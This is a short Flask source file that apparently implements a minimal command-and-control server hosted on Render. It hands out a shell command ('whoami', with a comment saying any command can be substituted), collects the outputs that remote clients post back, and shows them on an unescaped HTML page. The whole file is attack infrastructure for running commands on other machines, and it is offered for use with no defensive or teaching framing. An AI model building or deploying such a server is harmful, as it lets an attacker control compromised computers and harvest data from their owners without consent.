from flask import Flask, request, jsonify

app = Flask(__name__)

# In-memory list to store results (will reset on server restart)
results = []

@app.route('/command', methods=['GET'])
def get_command():
    return jsonify(cmd="whoami")  # You can change this to any command you want

@app.route('/result', methods=['POST'])
def post_result():
    data = request.get_json()
    result = data.get("result", "No result")
    results.append(result)  # Save it in memory
    print("Received result:", result)
    return "OK"

@app.route('/view', methods=['GET'])
def view_results():
    if not results:
        return "No results yet."
    return "<h2>Received Results:</h2>" + "<br><br>".join(results)

# Required for Render to bind to correct port
import os
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
